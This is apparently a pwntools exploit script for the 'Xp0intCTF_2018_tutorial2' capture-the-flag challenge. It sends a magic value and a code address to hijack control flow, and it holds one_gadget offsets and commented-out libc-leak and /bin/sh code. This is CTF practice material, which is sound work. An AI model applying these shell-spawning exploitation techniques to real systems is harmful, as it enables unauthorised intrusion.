import sys
from pwn import *
from ctypes import *
from pwn_debug.pwn_debug import *
binary='Xp0intCTF_2018_tutorial2'
elf=ELF(binary)
pdbg=pwn_debug(binary)
pdbg.local("/lib/x86_64-linux-gnu/libc.so.6")
pdbg.debug("2.23")
pdbg.remote('node3.buuoj.cn',29706)
pdbg.context.log_level='debug'
while True :
	# try :
		if len(sys.argv)==1 :
			#io=pdbg.run("debug")
			io=pdbg.run("local")
			libc=pdbg.libc
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]
			# one_gadgaet=[0x41602,0x41656,0xdef36]
		else :
			io=pdbg.run("remote")
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			# libc=ELF('../../x64libc/libc.so.6')
			# one_gadgaet=[0x4f2c5,0x4f322,0x10a38c]
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]


		def add(a,b,c):
			io.sendlineafter('4.show\n','1')
			io.sendlineafter('index:\n',str(a))
			io.sendlineafter('size:\n',str(b))
			io.sendafter('content:\n',c)

		def delete(a):
			io.sendlineafter('4.show\n','2')
			io.sendlineafter('index:\n',str(a))

		def edit(a,c):
			io.sendlineafter('4.show\n','3')
			io.sendlineafter('index:\n',str(a))
			io.sendafter('content:\n',c)

		def show(a):
			io.sendlineafter('4.show\n','4')
			io.sendlineafter('index:\n',str(a))
		

		io.recv()
		io.send(p32(0xdeadbeef))
		io.recv()
		io.send(p32(0x4006e6))

		# libc_base=u64(io.recvuntil('\x7f')[-6:]+'\x00\x00')-libc.sym['__malloc_hook']-88-0x10
		# libc.address=libc_base
		# system_addr=libc.sym['system']
		# bin_sh_addr=libc.search('/bin/sh\x00').next()
		# success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue